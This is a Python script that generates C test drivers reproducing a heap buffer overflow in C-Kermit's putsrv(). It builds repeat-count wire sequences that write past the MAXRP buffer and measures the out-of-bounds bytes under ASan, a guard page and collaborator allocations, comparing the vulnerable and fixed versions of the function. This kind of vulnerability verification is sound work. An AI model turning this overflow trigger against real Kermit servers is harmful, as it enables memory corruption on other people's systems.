#!/usr/bin/env python3
"""Generate verbatim-pin C drivers for the C-Kermit putsrv() overflow.

Reads pinned upstream sources under pins/, verifies every hash, extracts the
putsrv() definition verbatim from each, and emits it under #line directives so
ASan frames point at the original upstream line numbers. Aborts on pin drift.
"""
import hashlib
import pathlib
import re
import sys

HERE = pathlib.Path(__file__).resolve().parent
PINS = HERE / "pins"

EXPECT = {
    "ckcfns.c.vuln": "6afc5e4599777c6b9b2366b55dd9c05f9928c67aed3ab77eb29ed237858cc71f",
    "ckcfns.c.fixed": "7acdefc4ce7300f009a3b75712cb158ef454dfba35081a77abf151796df4abe9",
    "ckcker.h.vuln": "751a1a2270d28e6eeb5d8f11bafd3c5acd16db657d9ff9e8699be9971ba83290",
    "cve.json": "6c43f2b79cf77076ee7e11d3f4052a4d2793bcfb6219d01ea53084ec9576213f",
    "fix.patch": "2f25c8d7387d3d70d4c1867a0bd1becf60a7ce700956ae77b2ac4ce3706cf2b1",
}

# MAXRP is pinned from ckcker.h at v11.0.514:366 (#define MAXRP 9024).
MAXRP = 9024


def pinned(name):
    raw = (PINS / name).read_bytes()
    got = hashlib.sha256(raw).hexdigest()
    if got != EXPECT[name]:
        sys.exit(f"PIN DRIFT {name}: expected {EXPECT[name]} got {got}")
    return raw.decode("utf-8", "replace")


def extract_putsrv(text, name):
    """Return (start_line_1based, verbatim_function_text) for putsrv()."""
    lines = text.splitlines()
    marker = re.compile(r"^/\* putsrv \*/ \{")
    hits = [i for i, ln in enumerate(lines) if marker.match(ln)]
    if len(hits) != 1:
        sys.exit(f"{name}: expected one putsrv body marker, got {len(hits)}")
    i = hits[0]
    start = i - 6
    if not lines[start].lstrip().startswith("int"):
        sys.exit(f"{name}: unexpected putsrv definition start: {lines[start]!r}")
    depth = 0
    end = None
    for j in range(i, len(lines)):
        depth += lines[j].count("{") - lines[j].count("}")
        if j > i and depth == 0:
            end = j
            break
    if end is None:
        sys.exit(f"{name}: unterminated putsrv body")
    body = "\n".join(lines[start:end + 1])
    if "*srvptr++ = c;" not in body:
        sys.exit(f"{name}: verbatim write line missing")
    return start + 1, body


TEMPLATE = r'''/* Generated by gen_driver.py - do not edit. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/mman.h>

#define MAXRP @MAXRP@
typedef char CHAR;
static CHAR *srvptr;
static CHAR *srvcmd;
static int srvcmdlen = MAXRP;

/* Verbatim putsrv() extracted from @PINFILE@. */
#line @LINENO@ "@PINFILE@"
@PUTSRV@

/* Back to harness line numbering for the scaffolding. */
#line 1000 "harness.c"

/* Faithful decode() repeat path, pinned ckcfns.c.vuln:1357-1359/1405/1420:
   rptq prefix + one count byte + one data byte; xunchar() is tochar()'s
   inverse for printable Kermit counts. Each repeat calls putsrv(). */
static int xunchar(unsigned char c) { return (int)c - 32; }
static unsigned char tochar(int n) { return (unsigned char)(n + 32); }

static int decode_repeat(unsigned char *wire, int nseq, unsigned char data,
                         int *emitted, int *first_reject)
{
    int rc = 0;
    *emitted = 0;
    *first_reject = -1;
    for (int i = 0; i < nseq; i++) {
        unsigned char a = wire[3 * i];
        int rpt = 0;
        if (a == (unsigned char)'#') {       /* rptq, rptflg on */
            rpt = xunchar(wire[3 * i + 1]);
            a = wire[3 * i + 2];
        }
        if (rpt == 0) rpt = 1;
        for (; rpt > 0; rpt--) {
            int wrc = putsrv((CHAR)a);
            if (wrc < 0) {                   /* fixed build: bounded */
                if (rc == 0) { rc = -1; *first_reject = *emitted; }
                return rc;
            }
            (*emitted)++;
        }
    }
    return rc;
}

static unsigned char wire[3 * 128];
static void make_wire(int nseq, int count, unsigned char data)
{
    for (int i = 0; i < nseq; i++) {
        wire[3 * i] = (unsigned char)'#';
        wire[3 * i + 1] = tochar(count);
        wire[3 * i + 2] = data;
    }
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "tight";
    unsigned char fill = 0x41;
    int nseq = 0, count = 94;

    if (!strcmp(mode, "fit")) { nseq = MAXRP / 94; count = 94; }
    else if (!strcmp(mode, "oneover")) { nseq = (MAXRP / 94) + 1; count = 94; }
    else if (!strcmp(mode, "tight")) { nseq = (MAXRP / 94) + 2; count = 94; }
    else if (!strcmp(mode, "collab_5a")) { nseq = (MAXRP / 94) + 2; count = 94; fill = 0x5a; }
    else if (!strcmp(mode, "collab_41")) { nseq = (MAXRP / 94) + 2; count = 94; fill = 0x41; }
    else if (!strcmp(mode, "benign")) { nseq = MAXRP / 94; count = 94; }
    else if (!strcmp(mode, "guard")) { nseq = (MAXRP / 94) + 2; count = 94; }
    else { fprintf(stderr, "bad mode %s\n", mode); return 2; }

    make_wire(nseq, count, fill);
    size_t need = (size_t)(srvcmdlen + 1);  /* exactly chars + NUL */
    void *region = NULL;

    if (!strcmp(mode, "collab_5a") || !strcmp(mode, "collab_41") ||
        !strcmp(mode, "benign")) {
        region = calloc(1, 1 << 20);        /* 1 MiB collaborator */
        srvcmd = (CHAR *)region;
    } else if (!strcmp(mode, "guard")) {
        long ps = sysconf(_SC_PAGESIZE);
        region = mmap(NULL, (size_t)ps * 2, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (region == MAP_FAILED) return 2;
        if (mprotect((char *)region + ps, (size_t)ps, PROT_NONE) != 0) return 2;
        srvcmd = (CHAR *)((char *)region + ps - (srvcmdlen + 1));
    } else {
        region = malloc(need);              /* tight: ASan redzone adjacent */
        srvcmd = (CHAR *)region;
    }
    memset(srvcmd, 0, (size_t)(srvcmdlen + 1));
    srvptr = srvcmd;

    int emitted = 0, first_reject = -1;
    int rc = decode_repeat(wire, nseq, fill, &emitted, &first_reject);
    int oob = emitted - srvcmdlen;
    if (oob < 0) oob = 0;

    printf("mode=%s emitted=%d srvcmdlen=%d oob=%d decode_rc=%d first_reject=%d\n",
           mode, emitted, srvcmdlen, oob, rc, first_reject);
    if (!strcmp(mode, "collab_5a") || !strcmp(mode, "collab_41") ||
        !strcmp(mode, "benign")) {
        unsigned char *base = (unsigned char *)srvcmd;
        int n5a = 0, n41 = 0, nzero = 0;
        for (int i = srvcmdlen; i < srvcmdlen + 128; i++) {
            if (base[i] == 0x5a) n5a++;
            else if (base[i] == 0x41) n41++;
            else if (base[i] == 0) nzero++;
        }
        printf("offsets: first_oob=%02x at_%d=%02x count_5a=%d count_41=%d zeros=%d\n",
               (unsigned)base[srvcmdlen], srvcmdlen + 1,
               (unsigned)base[srvcmdlen + 1], n5a, n41, nzero);
    }
    fflush(stdout);
    return 0;
}
'''


def main():
    linenos = []
    for mode, pinfile, out in (
        ("vuln", "ckcfns.c.vuln", "driver_vuln.c"),
        ("fixed", "ckcfns.c.fixed", "driver_fixed.c"),
    ):
        text = pinned(pinfile)
        lineno, body = extract_putsrv(text, pinfile)
        if mode == "vuln":
            linenos.append(str(lineno))
        src = (TEMPLATE
               .replace("@MAXRP@", str(MAXRP))
               .replace("@PINFILE@", "pins/" + pinfile)
               .replace("@LINENO@", str(lineno - 1))  # GCC counts the #else branch as +1
               .replace("@PUTSRV@", body))
        (HERE / out).write_text(src)
        print(f"generated {out}: putsrv from {pinfile} starting line {lineno}")
    print("verbatim_write_line=" + ",".join(linenos))


if __name__ == "__main__":
    main()
